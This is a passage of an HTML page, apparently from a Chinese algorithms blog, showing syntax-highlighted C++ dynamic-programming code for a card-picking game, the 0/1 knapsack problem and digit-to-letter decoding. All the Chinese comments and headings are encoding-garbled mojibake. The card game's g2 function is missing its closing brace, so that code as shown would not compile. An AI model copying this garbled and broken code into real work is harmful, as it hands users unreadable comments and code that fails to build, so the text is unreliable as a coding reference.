å…ˆæ‰‹è·å¾—çš„æœ€å¥½åˆ†æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; fmap, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; gmap)</span> &#123;<br>    <span class="hljs-keyword">if</span> (fmap[L][R] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> fmap[L][R];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (L == R) &#123;<br>        ans = arr[L];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> p1 = arr[L] + g2(arr, L + <span class="hljs-number">1</span>, R, fmap, gmap);<br>        <span class="hljs-type">int</span> p2 = arr[R] + g2(arr, L, R - <span class="hljs-number">1</span>, fmap, gmap);<br>        ans = max(p1, p2);<br>    &#125;<br>    fmap[L][R] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// åæ‰‹è·å¾—çš„æœ€å¥½åˆ†æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">g2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> L, <span class="hljs-type">int</span> R, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; fmap, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; gmap)</span> &#123;<br>    <span class="hljs-keyword">if</span> (gmap[L][R] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> gmap[L][R];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (L != R) &#123;<br>        <span class="hljs-type">int</span> p1 = f2(arr, L + <span class="hljs-number">1</span>, R, fmap, gmap); <span class="hljs-comment">// å¯¹æ‰‹æ‹¿èµ°äº†Lä½ç½®çš„æ•°</span><br>        <span class="hljs-type">int</span> p2 = f2(arr, L, R - <span class="hljs-number">1</span>, fmap, gmap); <span class="hljs-comment">// å¯¹æ‰‹æ‹¿èµ°äº†Rä½ç½®çš„æ•°</span><br>        ans = min(p1, p2);<br>    &#125;<br>    gmap[L][R] = ans;<br>    <span class="hljs-keyword">return</span> ans;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">win2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = arr.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; fmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">-1</span>));<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; gmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">-1</span>));<br>    <span class="hljs-type">int</span> first = f2(arr, <span class="hljs-number">0</span>, N - <span class="hljs-number">1</span>, fmap, gmap);<br>    <span class="hljs-type">int</span> second = g2(arr, <span class="hljs-number">0</span>, N - <span class="hljs-number">1</span>, fmap, gmap);<br>    <span class="hljs-keyword">return</span> max(first, second);<br>&#125;<br><br><br><br>    <br><span class="hljs-type">int</span> <span class="hljs-title function_">win3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = arr.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; fmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; gmap(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(N, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        fmap[i][i] = arr[i];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> startCol = <span class="hljs-number">1</span>; startCol &lt; N; startCol++) &#123;<br>        <span class="hljs-type">int</span> L = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> R = startCol;<br>        <span class="hljs-keyword">while</span> (R &lt; N) &#123;<br>            fmap[L][R] = max(arr[L] + gmap[L + <span class="hljs-number">1</span>][R], arr[R] + gmap[L][R - <span class="hljs-number">1</span>]);<br>            gmap[L][R] = min(fmap[L + <span class="hljs-number">1</span>][R], fmap[L][R - <span class="hljs-number">1</span>]);<br>            L++;<br>            R++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(fmap[<span class="hljs-number">0</span>][N - <span class="hljs-number">1</span>], gmap[<span class="hljs-number">0</span>][N - <span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;win1: &quot;</span> &lt;&lt; win1(arr) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;win2: &quot;</span> &lt;&lt; win2(arr) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;win3: &quot;</span> &lt;&lt; win3(arr) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="èƒŒåŒ…"><a href="#èƒŒåŒ…" class="headerlink" title="èƒŒåŒ…"></a>èƒŒåŒ…</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ‰€æœ‰çš„è´§ï¼Œé‡é‡å’Œä»·å€¼ï¼Œéƒ½åœ¨wå’Œvæ•°ç»„é‡Œï¼Œ ä¸ºäº†æ–¹ä¾¿ï¼Œå…¶ä¸­æ²¡æœ‰è´Ÿæ•° bagèƒŒåŒ…å®¹é‡ï¼Œä¸èƒ½è¶…è¿‡è¿™ä¸ªè½½é‡ è¿”å›ï¼šä¸è¶…é‡çš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿå¾—åˆ°çš„æœ€å¤§ä»·å€¼</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// å°è¯•å‡½æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (rest &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (index == w.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> p1 = process(w, v, index + <span class="hljs-number">1</span>, rest);<br>    <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> next = process(w, v, index + <span class="hljs-number">1</span>, rest - w[index]);  <span class="hljs-comment">//è¿™æ ·å†™ä¸å¥½ï¼Œå› ä¸ºå‚»ç¼“å­˜æ³•ä¼šè¶Šç•Œï¼Œä¸€å¼€å§‹å°±è¿‡æ»¤æ‰è´Ÿæ•°çš„å¯èƒ½</span><br>    <span class="hljs-keyword">if</span> (next != <span class="hljs-number">-1</span>) &#123;  <br>        p2 = v[index] + next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> max(p1, p2);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> bag)</span> &#123;<br>    <span class="hljs-keyword">if</span> (w.empty() || v.empty() || w.size() != v.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> process(w, v, <span class="hljs-number">0</span>, bag);<br>&#125;<br><br><br><br><span class="hljs-comment">// å‚»ç¼“å­˜</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> rest, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dp[index][rest] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[index][rest];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (rest &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (index == w.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// ä¸é€‰å½“å‰ç‰©å“</span><br>    <span class="hljs-type">int</span> p1 = process(w, v, index + <span class="hljs-number">1</span>, rest, dp);<br><span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span> ; <br>    <span class="hljs-comment">// é€‰æ‹©å½“å‰ç‰©å“</span><br>  <span class="hljs-keyword">if</span> (rest &gt;= w[index]) &#123; <span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼Œå› ä¸ºå‚æ•°ä½œä¸ºæ•°ç»„ä¸‹æ ‡ä¸€å¼€å§‹å°±ä¸è¦è®©å®ƒè¶Šç•Œ</span><br>        p2 = v[index] + process(w, v, index + <span class="hljs-number">1</span>, rest - w[index], dp);<br>&#125;<br>    dp[index][rest] = max(p1, p2);<br>    <span class="hljs-keyword">return</span> dp[index][rest];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> bag)</span> &#123;<br>    <span class="hljs-keyword">if</span> (w.empty() || v.empty() || w.size() != v.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// ç”¨ -1 åˆå§‹åŒ– dp æ•°ç»„</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(w.size() + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(bag + <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>));<br><br>    <span class="hljs-comment">// è°ƒç”¨ process å‡½æ•°è®¡ç®—æœ€å¤§ä»·å€¼</span><br>    <span class="hljs-keyword">return</span> process(w, v, <span class="hljs-number">0</span>, bag, dp);<br>&#125; <br><br><br><br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’è§£æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; w, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; v, <span class="hljs-type">int</span> bag)</span> &#123;<br>    <span class="hljs-keyword">if</span> (w.empty() || v.empty() || w.size() != v.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = w.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(bag + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = N - <span class="hljs-number">1</span>; index &gt;= <span class="hljs-number">0</span>; index--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= bag; rest++) &#123;<br>            <span class="hljs-type">int</span> p1 = dp[index + <span class="hljs-number">1</span>][rest];<br>            <span class="hljs-type">int</span> p2 = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> next = (rest - w[index] &lt; <span class="hljs-number">0</span>) ? <span class="hljs-number">-1</span> : dp[index + <span class="hljs-number">1</span>][rest - w[index]];<br>            <span class="hljs-keyword">if</span> (next != <span class="hljs-number">-1</span>) &#123;<br>                p2 = v[index] + next;<br>            &#125;<br>            dp[index][rest] = max(p1, p2);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][bag];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; weights = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>&#125;;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; values = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">int</span> bag = <span class="hljs-number">15</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Max Value (Recursive): &quot;</span> &lt;&lt; maxValue(weights, values, bag) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Max Value (DP): &quot;</span> &lt;&lt; dp(weights, values, bag) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æ•°å­—è½¬æˆå­—æ¯çš„æ‰€æœ‰æ–¹æ³•"><a href="#æ•°å­—è½¬æˆå­—æ¯çš„æ‰€æœ‰æ–¹æ³•" class="headerlink" title="æ•°å­—è½¬æˆå­—æ¯çš„æ‰€æœ‰æ–¹æ³•"></a>æ•°å­—è½¬æˆå­—æ¯çš„æ‰€æœ‰æ–¹æ³•</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// é€’å½’è§£æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str, <span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == str.size()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> ways = process(str, i + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; str.size() &amp;&amp; (str[i] - <span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + (str[i + <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>) &lt; <span class="hljs-number">27</span>) &#123;<br>        ways += process(str, i + <span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ways;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">number</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; str)</span> &#123;<br>    <span class="hljs-keyword">if</span> (str.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">strArr</span><span class="hljs-params">(str.begin(), str.end())</span>;<br>    <span class="hljs-keyword">return</span> process(strArr, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// ä»å³å¾€å·¦çš„åŠ¨æ€è§„åˆ’</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = s.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">dp</span><span class="hljs-params">(N + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span>;<br>    dp[N] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = N - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] != <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>            <span class="hljs-type">int</span> ways = dp[i + <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span> &lt; N &amp;&amp; (s[i] - <span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + (s[i + <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>) &lt; <span class="hljs-number">27</span>) &#123;<br>                ways += dp[i + <span class="hljs-number">2</span>];<br>            &#125;<br>            dp[i] = ways;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">// ä»å·¦å¾€å³çš„åŠ¨æ€è§„åˆ’</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> N = s.size();<br>    <span class="hljs-keyword">if</span> (s[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">dp</span><span class="hljs-params">(N, <span class="hljs-number">0</span>)</span>;<br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>            <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span> || s[i - <span class="hljs-number">1</span>] &gt; <span class="hljs-string">&#x27;2&#x27;</span> || (i - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; dp[i - <span class="hljs-number">2</span>] == <span class="hljs-number">0</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dp[i] = (i - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">0</span>) ? dp[i - <span class="hljs-number">2</span>] : <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            dp[i] = dp[i - <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; (s[i - <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>) * <span class="hljs-number">10</span> + (s[i] - <span class="hljs-string">&#x27;0&#x27;</span>) &lt;= <span class="hljs-number">26</span>) &#123;<br>                dp[i] += (i - <span class="hljs-number">2</span> &gt;= <span class="hljs-number">0</span>) ? dp[i - <span class="hljs-number">2</span>] : <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[N - <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-comment">// éšæœºç”Ÿæˆæµ‹è¯•å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">string</span> <span class="hljs-title function_">randomString</span><span class="hljs-params">(<span class="hljs-type">int</span> len)</span> &#123;<br>    <span class="hljs-built_in">string</span> str;<br>    <span class="hljs-keyword">for</span> (<span 